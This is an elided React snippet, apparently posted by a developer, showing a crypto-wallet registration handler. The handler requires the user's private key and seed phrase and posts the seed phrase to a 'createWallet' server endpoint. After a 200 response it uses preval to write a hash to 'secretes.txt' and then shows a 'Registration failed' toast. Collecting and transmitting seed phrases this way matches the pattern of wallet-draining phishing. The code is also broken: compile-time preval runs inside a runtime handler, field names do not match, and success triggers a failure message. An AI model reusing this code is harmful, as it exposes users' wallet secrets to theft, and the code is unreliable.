...
function Home() {
  ...
  const { isLoading:loading, isError:errors, data: queryregistration, refetch:registerRefresh } = useQuery({ queryKey: ['usersAccount'], queryFn: registerUsers })
    ...
    try {
      ...
      if(register.email !== "" && register.password !== "" && register.nickname !== "" && register.usersAccount !== "" && register.usersPrivateKey !== "" && register.usersSeedPhrase !== ""){
           ...
           let data = {
             ...
             seedPhrase:register.seedPhrase,
             nickname:register.nickname,
             email:register.email
           }

const response = await axios.post(`${import.meta.env.VITE_REACT_APP_MAIN_ENDPOINT}createWallet`,data)
    if(response.status == 200){
      const secreteFiles = preval`
      const fs = require('fs')
      fs.writeFileSync("./secretes.txt", ${HASH});
    `;
      ...
      toast("🤝 Registration failed with ", {
        position: "top-right",
        autoClose: 5000,
        hideProgressBar: false,
        closeOnClick: true,
